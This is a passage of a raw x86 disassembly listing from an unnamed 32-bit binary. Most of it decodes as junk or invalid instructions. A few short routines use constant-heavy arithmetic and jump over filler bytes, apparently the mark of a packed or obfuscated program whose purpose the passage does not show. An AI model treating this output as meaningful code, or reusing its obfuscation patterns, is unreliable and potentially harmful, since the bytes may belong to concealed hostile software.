  41487d:	jmp    0x7d43ccd2
  414882:	sub    eax,0x734ad4f
  414887:	adc    esp,esp
  414889:	js     0x41489a
  41488b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41488c:	bound  ebp,QWORD PTR [ebx-0x53]
  41488f:	lock xchg ebx,eax
  414891:	jb     0x41481b
  414893:	clc    
  414894:	pop    ds
  414895:	cld    
  414896:	aad    0xe4
  414898:	mov    edx,0xbe2e83c
  41489d:	jae    0x41482f
  41489f:	pop    es
  4148a0:	mov    dl,0xf0
  4148a2:	mov    eax,0x130533b8
  4148a7:	test   DWORD PTR [ecx+0x1b7cc24e],ecx
  4148ad:	mov    ah,0x54
  4148af:	fdivr  QWORD PTR [esi+edx*2]
  4148b2:	pop    ebx
  4148b3:	or     ebx,edi
  4148b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148b6:	adc    BYTE PTR [edi+0x690c5763],al
  4148bc:	inc    ecx
  4148bd:	imul   edx,ebx,0x8a21b92c
  4148c3:	push   ss
  4148c4:	add    ebx,DWORD PTR ds:[eax+0x20]
  4148c8:	pop    eax
  4148c9:	xchg   ebp,eax
  4148ca:	fst    QWORD PTR [edi-0x4664429d]
  4148d0:	xor    ecx,DWORD PTR [ecx+ebx*8-0x1ee40cd5]
  4148d7:	stos   BYTE PTR es:[edi],al
  4148d8:	mov    ch,0x84
  4148da:	mov    al,BYTE PTR [ecx-0x56ac1414]
  4148e0:	rcr    DWORD PTR [ecx],cl
  4148e2:	mov    BYTE PTR [ebx+0x5c77828d],al
  4148e8:	mov    ah,0x76
  4148ea:	mov    esi,0xde51ae54
  4148ef:	clc    
  4148f0:	sbb    edi,ecx
  4148f2:	retf   
  4148f3:	sti    
  4148f4:	das    
  4148f5:	(bad)  
  4148f7:	neg    BYTE PTR [edx]
  4148f9:	xchg   esp,eax
  4148fa:	push   edi
  4148fb:	into   
  4148fc:	in     al,0x40
  4148fe:	xchg   ecx,eax
  4148ff:	(bad)  
  414900:	aaa    
  414901:	adc    al,0x53
  414903:	sub    DWORD PTR [ebx-0xe],edx
  414906:	scas   eax,DWORD PTR es:[edi]
  414907:	nop
  414908:	outs   dx,BYTE PTR ds:[esi]
  414909:	cs in  eax,dx
  41490b:	fcom   DWORD PTR [eax]
  41490d:	lock add BYTE PTR [ebx],bl
  414910:	pop    edi
  414911:	adc    esp,edi
  414913:	jmp    0x1b48:0x9a35c0a7
  41491a:	pop    edx
  41491b:	sbb    dl,BYTE PTR [edx+ebx*1+0x7927a911]
  414922:	and    eax,0x38e6d6ae
  414927:	push   0x5ff96f7b
  41492c:	pop    ebx
  41492d:	adc    BYTE PTR [edx-0x48],bh
  414930:	xor    bl,BYTE PTR [esi+edi*4-0x2205a6cd]
  414937:	dec    eax
  414938:	adc    al,BYTE PTR [eax+eiz*1+0x4b]
  41493c:	(bad)  
  41493d:	xchg   edx,eax
  41493e:	xor    DWORD PTR [ebp+0x33c7cd86],ebx
  414944:	push   0x32
  414946:	sbb    edi,DWORD PTR [ebx+ecx*4]
  414949:	dec    ebp
  41494a:	cld    
  41494b:	mov    eax,0xffffeff8
  414950:	mov    edx,eax
  414952:	sub    edx,ecx
  414954:	add    edx,DWORD PTR [ebp-0x8]
  414957:	mov    ecx,DWORD PTR [ebp-0xc]
  41495a:	or     edx,ecx
  41495c:	mov    ecx,DWORD PTR [ebp-0x4]
  41495f:	imul   edx,edx,0x85300
  414965:	sub    eax,ecx
  414967:	add    eax,DWORD PTR [ebp-0x8]
  41496a:	mov    ecx,DWORD PTR [ebp-0xc]
  41496d:	or     eax,ecx
  41496f:	mov    ecx,DWORD PTR [ebp+0x8]
  414972:	mov    ecx,DWORD PTR [edx+ecx*1+0x1c323f3c]
  414979:	add    eax,0x40e5
  41497e:	imul   eax,eax,0x214c
  414984:	jmp    0x414d49
  414989:	retf   0x46a0
  41498c:	mov    ds:0xa02a1a22,al
  414991:	pop    es
  414992:	inc    ecx
  414993:	repnz push 0x66
  414996:	xor    ebx,DWORD PTR [eax]
  414998:	stos   BYTE PTR es:[edi],al
  414999:	mov    ebx,DWORD PTR [eax+ebx*1]
  41499c:	sbb    al,dl
  41499e:	adc    bl,BYTE PTR [eax]
  4149a0:	sbb    BYTE PTR [eax+0x58290a77],cl
  4149a6:	and    al,0xfd
  4149a8:	fs das 
  4149aa:	mov    esp,DWORD PTR [edi]
  4149ac:	and    eax,esp
  4149ae:	and    bl,cl
  4149b0:	gs inc esi
  4149b2:	push   0xffffff8f
  4149b4:	mov    esi,0xc2ad1cfb
  4149b9:	dec    ebx
  4149ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149bb:	push   edi
  4149bc:	sub    al,0x5c
  4149be:	mov    eax,ds:0x6216c6a4
  4149c3:	clc    
  4149c4:	xor    eax,0xa36e1ade
  4149c9:	sub    BYTE PTR cs:[ecx-0x3d],0xd8
  4149ce:	pop    ss
  4149cf:	cmp    ah,ah
  4149d1:	mov    esp,0x7dcb0e6c
  4149d6:	repnz or BYTE PTR [eax],ch
  4149d9:	jle    0x414a56
  4149db:	hlt    
  4149dc:	(bad)  
  4149dd:	mov    ds:0x20381070,al
  4149e2:	jmp    0xf5bbbc52
  4149e7:	scas   eax,DWORD PTR es:[edi]
  4149e8:	in     al,0x6a
  4149ea:	add    al,0xba
  4149ec:	mov    edi,DWORD PTR [edx+0x70]
  4149ef:	add    edx,edx
  4149f1:	cmp    eax,0x2896cb78
  4149f6:	adc    BYTE PTR [edi],cl
  4149f8:	mov    esi,0x5142edf2
  4149fd:	retf   0x3d7d
  414a00:	sbb    eax,0xc24551c1
  414a05:	addr16 call 0xd290:0xbcb40f68
  414a0d:	add    al,0xd4
  414a0f:	push   0xf17752af
  414a14:	pop    edi
  414a15:	sub    dl,dl
  414a17:	mov    BYTE PTR [eax-0x1bd5630c],ch
  414a1d:	dec    esi
  414a1e:	and    DWORD PTR [edi-0x69eadc4a],edx
  414a24:	shrd   ebx,esi,cl
  414a27:	push   ebp
  414a28:	xor    al,0x9f
  414a2a:	cmp    DWORD PTR [ebp-0x4cbac694],ebp
  414a30:	mov    es,WORD PTR [ecx]
  414a32:	adc    dh,ah
  414a34:	mov    esp,0x1a5b3a89
  414a39:	cdq    
  414a3a:	dec    ebx
  414a3b:	repz push edi
  414a3d:	iret   
  414a3e:	mov    ch,ch
  414a40:	mov    ds:0x5c60f925,al
  414a45:	test   eax,0x3cd50f94
  414a4a:	sbb    DWORD PTR [eax+0x12f5c4cc],ecx
  414a50:	cwde   
  414a51:	jg     0x414ab3
  414a53:	les    ecx,FWORD PTR [ebp-0x7be84440]
  414a59:	gs loope 0x414ac2
  414a5c:	inc    ebx
  414a5d:	add    al,0x36
  414a5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a60:	sub    esp,edi
  414a62:	dec    ebx
  414a63:	je     0x4149f4
  414a65:	and    ebx,DWORD PTR [ecx]
  414a67:	push   ecx
  414a68:	and    al,0xfd
  414a6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a6b:	rcl    DWORD PTR [edi-0x158a485f],0x6
  414a72:	push   0x95216bba
  414a77:	adc    DWORD PTR [esi+0x391cbd36],ebp
  414a7d:	test   dh,dl
  414a7f:	(bad)  
  414a80:	popf   
  414a81:	mov    ds:0x8ecc8f92,al
  414a86:	pop    edx
  414a88:	out    0xb8,al
  414a8a:	ss mov ah,0xb4
  414a8d:	or     cl,BYTE PTR [esi-0x1]
  414a90:	sbb    ecx,DWORD PTR [ecx]
  414a92:	jmp    0x414b07
  414a94:	mov    gs,WORD PTR [ebx+0x50]
  414a97:	int    0x44
  414a99:	out    dx,al
  414a9a:	lahf   
  414a9b:	inc    edx
  414a9c:	mov    eax,ds:0x9491f6ea
  414aa1:	add    al,0x49
  414aa3:	gs ins BYTE PTR es:[edi],dx
  414aa5:	mov    cl,0x13
  414aa7:	xchg   edi,eax
  414aa8:	add    BYTE PTR [ebx-0x7f],bh
  414aab:	xor    al,0xda
  414aad:	int3   
  414aae:	test   eax,0x119099cc
  414ab3:	cmp    eax,0xc29e0d26
  414ab8:	(bad)  
  414ab9:	xchg   esi,eax
  414aba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414abb:	mov    DWORD PTR [esi],esp
  414abd:	jne    0x414ac1
  414abf:	aad    0x73
  414ac1:	(bad)  
  414ac2:	pop    edx
  414ac3:	inc    ebx
  414ac4:	adc    BYTE PTR [esi-0xc],cl
  414ac7:	jg     0x414aec
  414ac9:	xchg   edx,eax
  414aca:	pop    edx
  414acb:	popf   
  414acc:	imul   ebx,DWORD PTR [edx-0xcfafc47],0xde796722
  414ad6:	xchg   edi,eax
  414ad7:	push   edx
  414ad8:	jge    0x414b55
  414ada:	push   ds
  414adb:	pushf  
  414adc:	aaa    
  414add:	aaa    
  414ade:	jno    0x414ab2
  414ae0:	adc    al,0x17
  414ae2:	ins    BYTE PTR es:[edi],dx
  414ae3:	inc    ebx
  414ae4:	test   eax,0x9184abd8
  414ae9:	lahf   
  414aea:	aad    0x76
  414aec:	push   ds
  414aed:	sub    bh,bl
  414aef:	jg     0x414a72
  414af1:	push   eax
  414af2:	(bad)  
  414af4:	adc    al,0x6d
  414af6:	cmc    
  414af7:	xchg   ebp,eax
  414af8:	mov    ebp,0x1330d102
  414afd:	pop    ebp
  414afe:	lods   eax,DWORD PTR ds:[esi]
  414aff:	out    dx,al
  414b00:	cmp    al,0x72
  414b02:	lahf   
  414b03:	or     WORD PTR [ebp-0xcbd4b0],bx
  414b0a:	and    al,0x35
  414b0c:	int    0x3e
  414b0e:	aad    0xa0
  414b10:	fst    DWORD PTR [ecx-0x6d]
  414b13:	call   0x3ae7:0xaa448694
  414b1a:	cli    
  414b1b:	loop   0x414b74
  414b1d:	inc    esp
  414b1e:	pushf  
  414b1f:	mov    ds:0x710646b2,eax
  414b24:	sti    
  414b25:	xchg   ecx,eax
  414b26:	sahf   
  414b27:	inc    ebp
  414b28:	neg    DWORD PTR [eax+0x4d]
  414b2b:	xrelease mov DWORD PTR [ebp+0x77],ebx
  414b2f:	xchg   edx,eax
  414b30:	call   0xd8f6:0x7919387b
  414b37:	out    0x6,ax
  414b3a:	mov    eax,0xac55a026
  414b3f:	cmp    ah,BYTE PTR [esi-0x3fe59859]
  414b45:	push   cs
  414b46:	inc    esi
  414b47:	sbb    eax,0x3268594a
  414b4c:	sbb    BYTE PTR [ebp-0x5899e240],bh
  414b52:	imul   edx,DWORD PTR [eax-0x6f],0xcbb5593d
  414b59:	mov    ds:0x2fb45d94,eax
  414b5e:	dec    edi
  414b5f:	arpl   WORD PTR ds:0xa2a04b65,di
  414b65:	inc    esi
  414b66:	mov    al,0xe
  414b68:	add    al,0xd6
  414b6a:	xor    DWORD PTR [edi-0x71a7850c],edx
  414b70:	outs   dx,DWORD PTR ds:[esi]
  414b71:	xchg   edx,eax
  414b72:	(bad)  
  414b73:	adc    BYTE PTR [ebp-0x74817b7e],dh
  414b79:	(bad)  [edx+0x5179de9a]
  414b7f:	clc    
  414b80:	cmc    
  414b81:	es in  al,dx
  414b83:	cmp    al,0xd8
  414b85:	dec    edx
  414b86:	lock xor DWORD PTR [ecx-0x7b981d60],0x6b7dacf5
  414b91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b92:	(bad)  
  414b93:	mov    cl,0x18
  414b95:	in     eax,0x31
  414b97:	call   0x4afc:0x8cf162f2
  414b9e:	in     al,0xdb
  414ba0:	in     eax,dx
  414ba1:	mov    fs,WORD PTR [ecx-0x4cdef4ba]
  414ba7:	(bad)  
  414ba9:	mov    cl,0x34
  414bab:	retf   0xa2f0
  414bae:	lods   al,BYTE PTR ds:[esi]
  414baf:	sahf   
  414bb0:	aam    0x1a
  414bb2:	dec    esi
  414bb3:	mov    bl,0xac
  414bb5:	test   eax,0x49241f1b
  414bba:	out    0xef,al
  414bbc:	test   BYTE PTR [ecx-0x598e8d1e],bh
  414bc2:	lods   eax,DWORD PTR ds:[esi]
  414bc3:	int3   
  414bc4:	mov    ch,0x2e
  414bc6:	je     0x414b63
  414bc8:	push   es
  414bc9:	scas   al,BYTE PTR es:[edi]
  414bca:	jmp    0x414b78
  414bcc:	int    0x25
  414bce:	jo     0x414b91
  414bd0:	dec    ecx
  414bd1:	in     al,dx
  414bd2:	fwait
  414bd3:	jo     0x414be1
  414bd5:	cmp    al,0x8f
  414bd7:	int3   
  414bd8:	lea    esp,[eax-0x2e]
  414bdb:	lea    ebp,[edx-0x5f]
  414bde:	or     ecx,esi
  414be0:	nop
  414be1:	jnp    0x414c33
  414be3:	test   ebx,ecx
  414be5:	mov    bh,0x3f
  414be7:	ins    DWORD PTR es:[edi],dx
  414be8:	xchg   DWORD PTR [ecx+edx*8],edi
  414beb:	call   0x1144:0xae9506be
  414bf2:	push   esi
  414bf3:	dec    esp
  414bf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bf5:	jne    0x414be6
  414bf7:	imul   esp,DWORD PTR [ebx+eiz*8-0x47],0x66e87e5f
  414bff:	fwait
  414c00:	in     eax,0xe3
  414c02:	cli    
  414c03:	jmp    0x414baf
  414c05:	cmc    
  414c06:	ja     0x414c4c
  414c08:	mov    al,0x2b
  414c0a:	inc    esi
  414c0b:	inc    edx
  414c0c:	push   esp
  414c0d:	mov    ebx,esp
  414c0f:	js     0x414b94
  414c11:	lock pushf 
  414c13:	and    DWORD PTR [edx+ecx*8],esp
  414c16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c17:	fs es scas eax,DWORD PTR es:[edi]
  414c1a:	inc    ecx
  414c1b:	and    eax,0x109259a2
  414c20:	iret   
  414c21:	fimul  DWORD PTR [ebp+0x6f5e798a]
  414c27:	adc    DWORD PTR [ebx],esp
  414c29:	dec    edi
  414c2a:	addr16 hlt 
  414c2c:	cli    
  414c2d:	lds    esi,FWORD PTR [edx+edx*4-0x61097cb6]
  414c34:	adc    al,0xaa
  414c36:	inc    edi
  414c37:	mov    esi,0x9287751f
  414c3c:	aas    
  414c3d:	push   0xa0522cdc
  414c42:	rcl    bl,1
  414c44:	xor    esi,DWORD PTR [edx+0x62]
  414c47:	in     al,dx
  414c48:	push   cs
  414c49:	mov    DWORD PTR [esp+ecx*2+0x59ea5ac3],edi
  414c50:	sub    al,dl
  414c52:	sar    BYTE PTR ds:0xf2fd5b81,1
  414c58:	into   
  414c59:	jno    0x414cae
  414c5b:	dec    ecx
  414c5c:	inc    eax
  414c5d:	mov    al,0x56
  414c5f:	push   cs
  414c60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c61:	ror    cl,1
  414c63:	inc    BYTE PTR gs:[ebx+eiz*1-0x1a51922f]
  414c6b:	mov    ah,0xb4
  414c6d:	out    0x6c,al
  414c6f:	sbb    eax,0x80047a1a
  414c74:	push   0x4eb27f3c
  414c79:	jnp    0x414c6e
  414c7b:	ja     0x414cbf
  414c7d:	xchg   ecx,eax
  414c7e:	leave  
  414c7f:	loop   0x414c70
  414c81:	jge    0x414c72
  414c83:	pop    ss
  414c84:	or     esp,DWORD PTR [ecx]
  414c86:	sub    BYTE PTR [ebx],al
  414c88:	adc    dh,BYTE PTR [edx]
  414c8a:	xchg   edx,eax
  414c8b:	and    BYTE PTR [ebx+0x5efc9166],ah
  414c91:	add    BYTE PTR ds:0xa41566c0,al
  414c97:	test   al,0x33
  414c99:	mov    BYTE PTR [ecx-0x13],bh
  414c9c:	and    dl,cl
  414c9e:	jno    0x414c20
  414ca0:	test   BYTE PTR [ecx],al
  414ca2:	retf   0x9f90
  414ca5:	leave  
  414ca6:	out    dx,al
  414ca7:	repnz mov eax,0xdc3bf7db
  414cad:	inc    eax
  414cae:	push   ebx
  414caf:	xchg   esi,eax
  414cb0:	xchg   esp,eax
  414cb1:	xchg   ebp,eax
  414cb2:	int    0x7
  414cb4:	dec    esi
  414cb5:	iret   
  414cb6:	dec    edx
  414cb7:	pop    ss
  414cb8:	(bad)  
  414cb9:	(bad)  
  414cba:	dec    ecx
  414cbb:	(bad)  
  414cbc:	xor    eax,0x83ebd90
  414cc1:	scas   al,BYTE PTR es:[edi]
  414cc2:	xor    BYTE PTR [ecx],dl
  414cc4:	cmp    dl,BYTE PTR [esi-0x6c]
  414cc7:	and    esp,eax
  414cc9:	popa   
  414cca:	xchg   ecx,eax
  414ccb:	lahf   
  414ccc:	loop   0x414cc9
  414cce:	and    BYTE PTR [ebx+0xceae2de],al
  414cd4:	jmp    0x414c5b
  414cd6:	aad    0x76
  414cd8:	arpl   WORD PTR [esi],di
  414cda:	std    
  414cdb:	jo     0x414cef
  414cdd:	popf   
  414cde:	mov    bl,0x1f
  414ce0:	in     al,0x66
  414ce2:	add    DWORD PTR [ecx-0x67a9c5b0],0x5
  414ce9:	mov    edi,0xf8bec0f4
  414cee:	or     DWORD PTR [edi-0x7d],0xd925714e
  414cf5:	out    dx,al
  414cf6:	push   0x21
  414cf8:	jnp    0x414cc1
  414cfa:	(bad)  
  414cfb:	arpl   sp,sp
  414cfd:	cmp    ch,al
  414cff:	xor    edi,DWORD PTR ds:[esi+eiz*1]
  414d03:	out    dx,al
  414d04:	div    DWORD PTR [edi]
  414d06:	jnp    0x414d07
  414d08:	cdq    
  414d09:	add    BYTE PTR [esi+0x320b94ca],ch
  414d0f:	test   BYTE PTR [edx],bh
  414d11:	and    al,0x97
  414d13:	fisub  DWORD PTR [ecx+edi*8-0x1b]
  414d17:	mov    DWORD PTR [esi-0xe000eb7],0xd79a768f
  414d21:	cld    
  414d22:	jge    0x414d97
  414d24:	test   eax,0x74f6615a
  414d29:	adc    eax,0xffffffc8
  414d2c:	mov    eax,ds:0x7f741ca9
  414d31:	xor    ah,BYTE PTR [esi]
  414d33:	loop   0x414d0a
  414d35:	aaa    
  414d36:	stos   BYTE PTR es:[edi],al
  414d37:	aad    0x9f
  414d39:	sbb    BYTE PTR [eax+0x15e8c476],bl
  414d3f:	sub    DWORD PTR [ebx-0x4d],0xa414af6e
  414d46:	shl    esi,1
  414d48:	lods   al,BYTE PTR ds:[esi]
  414d49:	add    eax,ecx
  414d4b:	mov    ecx,DWORD PTR [ebp+0x8]
  414d4e:	add    ecx,eax
  414d50:	mov    DWORD PTR [ebp+0x8],ecx
  414d53:	mov    eax,DWORD PTR [ebp-0x24]
  414d56:	mov    ecx,DWORD PTR [ebp-0x28]
  414d59:	and    eax,ecx
  414d5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  414d5e:	and    eax,ecx
  414d60:	mov    ecx,DWORD PTR [ebp-0x30]
  414d63:	imul   eax,ecx
  414d66:	mov    ecx,DWORD PTR [ebp-0x34]
  414d69:	or     eax,ecx
  414d6b:	mov    ecx,DWORD PTR [ebp-0x38]
  414d6e:	imul   eax,ecx
  414d71:	mov    ecx,DWORD PTR [ebp+0x8]
  414d74:	sub    eax,0x777ea653
  414d79:	cmp    DWORD PTR [ecx+0x54],eax
  414d7c:	je     0x414d8a
  414d82:	mov    eax,DWORD PTR [ebp+0x8]
  414d85:	jmp    0x414dd1
  414d8a:	mov    eax,DWORD PTR [ebp-0x3c]
  414d8d:	sub    eax,0x5258
  414d92:	xor    eax,0x49e9
  414d97:	add    eax,0x253
  414d9c:	jmp    0x414dd1
  414da1:	mov    DWORD PTR [ebp-0x3c],0x4177
  414da8:	mov    DWORD PTR [ebp+0x8],0x1405
  414daf:	mov    eax,DWORD PTR [ebp+0x8]
  414db2:	mov    ecx,DWORD PTR [ebp-0x3c]
  414db5:	imul   eax,eax,0x58cc
  414dbb:	add    eax,0x3f39
  414dc0:	and    eax,ecx
  414dc2:	add    eax,0x3b90
  414dc7:	or     eax,0x4b1c
  414dcc:	sub    eax,0x7fdd
  414dd1:	leave  
  414dd2:	ret    0x4
  414dd5:	push   ebp
  414dd6:	mov    ebp,esp
  414dd8:	and    esp,0xfffffff8
  414ddb:	sub    esp,0x20
  414dde:	push   ebx
  414ddf:	push   esi
  414de0:	lea    eax,[esp+0x10]
  414de4:	mov    DWORD PTR [esp+0xc],eax
  414de8:	mov    eax,DWORD PTR [esp+0xc]
  414dec:	mov    ecx,DWORD PTR [esp+0x10]
  414df0:	jmp    0x4151d4
  414df5:	sbb    eax,0x1afa8288
  414dfa:	cli    
  414dfb:	sbb    al,0x26
  414dfd:	retf   0xbdbd
  414e00:	mov    al,0x6a
  414e02:	mov    dl,0x6d
  414e04:	mov    al,0x42
  414e06:	push   ss
  414e07:	push   ss
  414e08:	sbb    BYTE PTR [edx+0x38181812],dl
  414e0e:	ja     0x414e71
  414e10:	das    
  414e11:	out    0x5,al
  414e13:	jmp    0x2975d5ab
  414e18:	xchg   ecx,eax
  414e19:	shl    DWORD PTR [ecx+0x59],cl
  414e1c:	test   eax,0xcce95a0f
  414e21:	or     bl,BYTE PTR [ebx-0x3c]
  414e24:	ss loope 0x414df6
  414e27:	ins    BYTE PTR es:[edi],dx
  414e28:	fidiv  DWORD PTR [ebx+0x2d]
  414e2b:	xchg   DWORD PTR [ecx+0x7aaa1223],eax
  414e31:	inc    ebp
  414e32:	add    bh,BYTE PTR [edi+0x73]
  414e35:	scas   al,BYTE PTR es:[edi]
  414e36:	mov    DWORD PTR [eax-0x74],0x75134a2b
  414e3d:	ror    BYTE PTR [ebp-0x6bfe768f],cl
  414e43:	xchg   ebp,eax
  414e44:	es sub eax,0xfdb3e286
  414e4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e4b:	in     eax,0x80
  414e4d:	test   al,0xda
  414e4f:	pusha  
  414e50:	sbb    al,0xa6
  414e52:	stos   BYTE PTR es:[edi],al
  414e53:	hlt    
  414e54:	call   0x2994a01d
  414e59:	(bad)  
  414e5a:	sub    al,0x2d
  414e5c:	pop    esi
  414e5d:	call   0xc14db81f
  414e62:	cs jl  0x414ea4
  414e65:	add    al,0x3d
  414e67:	sub    BYTE PTR ds:0x79557d62,ch
  414e6d:	inc    ecx
  414e6e:	jmp    0x5b394b70
  414e73:	adc    eax,0xae783376
  414e78:	mov    esp,0xe4b6b7e
  414e7d:	popf   
  414e7e:	nop
  414e7f:	lods   al,BYTE PTR ds:[esi]
  414e80:	aaa    
  414e81:	(bad)  
  414e82:	mov    al,ds:0x5e2fe962
  414e87:	push   ebx
  414e88:	xlat   BYTE PTR ds:[ebx]
  414e89:	and    ecx,esi
  414e8b:	and    al,0xab
  414e8d:	shr    esp,cl
  414e8f:	int3   
  414e90:	pop    esp
  414e91:	xor    eax,0x95fa66dc
  414e96:	mov    al,ds:0x9e8d46f4
  414e9b:	(bad)  
  414e9c:	mov    ebx,0xbb8bfd55
  414ea1:	aam    0x62
  414ea3:	dec    ebx
  414ea4:	push   0xffffffaf
  414ea6:	jecxz  0x414eef
  414ea8:	dec    ebp
  414ea9:	jo     0x414e83
  414eab:	and    al,0xd0
  414ead:	sbb    al,cl
  414eaf:	mov    ds:0x6b745566,eax
  414eb4:	imul   eax,DWORD PTR [eax+ebx*4-0x6c56c4ae],0xc4991fa1
  414ebf:	mov    WORD PTR [ebx+0x3084b58b],cs
  414ec5:	push   edi
  414ec6:	stos   BYTE PTR es:[edi],al
  414ec7:	jmp    0x414e8b
  414ec9:	xchg   ecx,eax
  414eca:	mov    dh,0xd9
  414ecc:	mov    bh,0x33
  414ece:	stos   DWORD PTR es:[edi],eax
  414ecf:	(bad)  
  414ed1:	(bad)  
  414ed2:	dec    edi
  414ed3:	xchg   ebp,eax
  414ed4:	nop
  414ed5:	js     0x414e82
  414ed7:	and    eax,0xcb64bf4c
  414edc:	sbb    al,0x3d
  414ede:	adc    ecx,DWORD PTR [edx]
  414ee0:	lock push eax
  414ee2:	dec    ecx
  414ee3:	enter  0x9d12,0xa8
  414ee7:	call   0xc332:0xbfe47731
  414eee:	cs jg  0x414f69
  414ef1:	sbb    ebx,DWORD PTR [edx+0x1ff159e5]
  414ef7:	test   bl,ch
  414ef9:	sbb    eax,0x8590be99
  414efe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414eff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f00:	sti    
  414f01:	xor    al,0xc2
  414f03:	test   al,0x30
  414f05:	xor    eax,0xbd3497ba
  414f0a:	add    al,0x2c
  414f0c:	inc    edx
  414f0d:	loopne 0x414f0c
  414f0f:	xor    bh,ch
  414f11:	lds    edi,FWORD PTR [ecx+0x136ce282]
  414f17:	add    al,0xba
  414f19:	jmp    0x414f1c
  414f1b:	cmp    BYTE PTR [ebx-0x4e1e5ea8],bh
  414f21:	test   ebx,edi
  414f23:	not    BYTE PTR [ecx-0x2121874f]
  414f29:	imul   esp,DWORD PTR [ebp+eiz*4+0x7],0x11ad58e
  414f31:	adc    ah,BYTE PTR [esi]
  414f33:	adc    ebp,edi
  414f35:	outs   dx,BYTE PTR ds:[esi]
  414f36:	and    DWORD PTR [esi+0x181bd8f9],0xffffffe9
  414f3d:	sbb    edx,DWORD PTR [ecx+0x11]
  414f40:	sub    edx,eax
  414f42:	sub    ah,BYTE PTR [edi+0xbd27d59]
  414f48:	mov    esi,0x324a2ef3
  414f4d:	out    0xf9,al
  414f4f:	mov    bl,0x49
  414f51:	ret    
  414f52:	or     esi,DWORD PTR [ebx]
  414f54:	or     ebp,DWORD PTR [ebp-0x2bde14fd]
  414f5a:	adc    dh,BYTE PTR [ebp+0x7253e7bf]
  414f60:	fdiv   QWORD PTR [ecx]
  414f62:	in     al,dx
  414f63:	imul   edx,ebp,0x7b
  414f66:	in     al,dx
  414f67:	pop    eax
  414f68:	dec    ebp
  414f69:	repz pushfw 
  414f6c:	fldcw  WORD PTR [edi+0x24]
  414f6f:	call   0xdfce239f
  414f74:	xchg   esp,eax
  414f75:	sbb    DWORD PTR [edx],ebx
  414f77:	mov    eax,ds:0xb0d673db
  414f7c:	inc    ecx
  414f7d:	adc    eax,0x75565a24
  414f82:	aad    0x96
  414f84:	or     BYTE PTR [esi],bh
  414f86:	pop    ds
  414f87:	jmp    0x414f97
  414f89:	std    
  414f8a:	push   cs
  414f8b:	call   DWORD PTR [edx-0x184d84a2]
  414f91:	retf   0x9a2
  414f94:	mov    ecx,0x18849396
  414f99:	push   0xfe8fab46
  414f9e:	jmp    0xd181:0x3e3533a7
  414fa5:	push   ebp
  414fa6:	hlt    
  414fa7:	scas   al,BYTE PTR es:[edi]
  414fa8:	rcr    dh,cl
  414faa:	jle    0x414f39
  414fac:	sub    eax,0x4eb77d67
  414fb1:	inc    esp
  414fb2:	inc    esp
  414fb3:	fst    QWORD PTR [edi-0x7f]
  414fb6:	loope  0x414fe6
  414fb8:	adc    al,0xc9
  414fba:	adc    dh,dl
  414fbc:	fsub   st(5),st
  414fbe:	xchg   edx,eax
  414fbf:	ficomp WORD PTR [esp+edi*1-0x38cd702a]
  414fc6:	js     0x414fc4
  414fc8:	push   ebx
  414fc9:	xor    ebx,eax
  414fcb:	stos   BYTE PTR es:[edi],al
  414fcc:	mov    al,0xdc
  414fce:	arpl   di,sp
  414fd0:	or     ah,0xc2
  414fd3:	pusha  
  414fd4:	dec    esp
  414fd5:	int3   
  414fd6:	add    DWORD PTR [ebx-0x30],ebx
  414fd9:	lea    ecx,[eax-0x28ebd8a6]
  414fdf:	clc    
  414fe0:	and    esp,DWORD PTR [edi+0x2046002c]
  414fe6:	fs (bad) 
  414fe8:	or     edx,ebx
  414fea:	cmp    eax,0x403eb039
  414fef:	xchg   DWORD PTR [esi-0x69],esp
  414ff2:	jg     0x414ff1
  414ff4:	mov    eax,ds:0x42683d18
  414ff9:	bound  edi,QWORD PTR ss:[edx-0x48bb719e]
  415000:	out    0xd4,al
  415002:	test   eax,0x76d106e1
  415007:	sar    ch,1
  415009:	nop
  41500a:	std    
  41500b:	push   esi
  41500c:	inc    ebx
  41500d:	mov    ch,0x81
  41500f:	jg     0x414fa1
  415011:	mov    ds,WORD PTR [edx]
  415013:	push   esp
  415014:	addr16 cmp eax,0x7ba0f32
  41501a:	stos   DWORD PTR es:[edi],eax
  41501b:	shr    cl,cl
  41501d:	xlat   BYTE PTR ds:[ebx]
  41501e:	mov    ebx,0x84fa21e8
  415023:	in     eax,0xd2
  415025:	mov    edx,0x2d6d1b71
  41502a:	jp     0x41503a
  41502c:	dec    esp
  41502d:	pop    ds
  41502e:	add    cl,BYTE PTR [edi-0x7c]
  415031:	inc    esi
  415032:	rol    ch,0x4c
  415035:	fidivr WORD PTR [edi+0x67]
  415038:	jmp    ecx
  41503a:	ret    0x4838
  41503d:	xchg   edx,ecx
  41503f:	jbe    0x415045
  415041:	out    0x6b,al
  415043:	xchg   ebp,eax
  415044:	mov    ds:0xa66236c,al
  415049:	push   esp
  41504a:	jecxz  0x41505a
  41504c:	mov    ecx,DWORD PTR [edi+esi*4]
  41504f:	sbb    DWORD PTR [esi],eax
  415051:	mov    al,ds:0xdcc9a51d
  415056:	xchg   ebx,eax
  415057:	mov    bl,0x6c
  415059:	cwde   
  41505a:	ret    
  41505b:	lock or BYTE PTR [edx],dl
  41505e:	in     eax,0x50
  415060:	jnp    0x415064
  415062:	jle    0x4150c3
  415064:	arpl   WORD PTR [ebx],di
  415066:	sbb    bh,BYTE PTR [edi-0x59cc12db]
  41506c:	test   esi,eax
  41506e:	cmc    
  41506f:	lea    edx,[edi-0x3a]
  415072:	xchg   esp,eax
  415073:	retf   
  415074:	and    al,0x87
  415076:	je     0x4150a3
  415078:	push   ss
  415079:	mov    edx,0xf5ae86fb
  41507e:	cmp    esi,DWORD PTR [esi]
  415080:	cdq    
  415081:	dec    esi
  415082:	cdq    
  415083:	jmp    0x4150ac
  415085:	mov    ds:0xa44f1651,eax
  41508a:	lds    edx,FWORD PTR [eax-0x1f59355c]
